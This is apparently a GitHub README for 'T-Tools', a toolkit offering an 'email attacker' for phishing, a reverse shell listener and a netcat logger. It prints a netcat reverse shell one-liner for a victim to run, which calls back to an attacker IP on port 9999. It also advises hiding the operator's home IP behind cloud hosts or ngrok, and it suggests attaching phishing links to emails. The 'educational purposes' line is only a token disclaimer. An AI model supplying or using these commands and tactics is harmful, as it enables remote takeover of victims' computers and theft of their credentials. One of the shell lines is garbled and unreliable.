# T-Tools-advanced--cyber-security 


# What is T-Tools

* T-Tools is an advanced cyber-security tools set.


# What does it includes

What does it include for cyber-security

An email attacker
A web scrapper
An advanced  reverse shell listener
An advanced netcat shell logger

What does it include for normal work

It includes 

A random password generator
simple phone number locator

# Installation

 this works for almost every operating system
 
 In your terminal type these commands
 
    $ sudo install git
    $ git clone https://github.com/Hirukshacoder/T-Tools-advanced--cyber-security/
    $ cd T-Tools-advanced--cyber-security
    $ pip install -r requirements.txt
    $ python3 main.py
           
# Reverse shells 
 
To use the listener change the ip in net.py and run it to start listening

Makesure you add your ip to the victim's command.

* Guidlines 

* Always use a cloud linux machine or another os in the cloud, because when the victim type the command he can grab your home network ip.

* And this tool is only for educational purposes.

* This tool can take the full control of the computer.

* Another thing is that you can start listening on any port.
 
* Also you have to add your ip to the net.py as well as the victim's command in version 1.0. 

* And you can use linode, aws or google cloud services to make your cloud machine.

* You can even use ngrok tcp to use reverse - X

# Vol 1.0 

      kali@attacker - $ nano reverse.py
      kali@attacker - $ < add your ip to the listen >
      kali@attacker - $ python3 reverse.py
      kali@victim - $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <attacker ip> 9999 >/tmp/f  
    
    
 # Vol 1.1
 
      kali@attacker - $ python3 reverse.py
      kali@victim - $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 ip> 9999 >/tmp/f
           
           
           
           
           
     
 
           
    
# e-mail Attacker     

* This tool needs gmail less secure app access.

* To use it for phishing you can make a phishing link and attach to it.

* Your passwords won't be saved.

To activate 

        kali@attacker - $ python3 email-attacker.py 
        



Made with 💖 by THb 
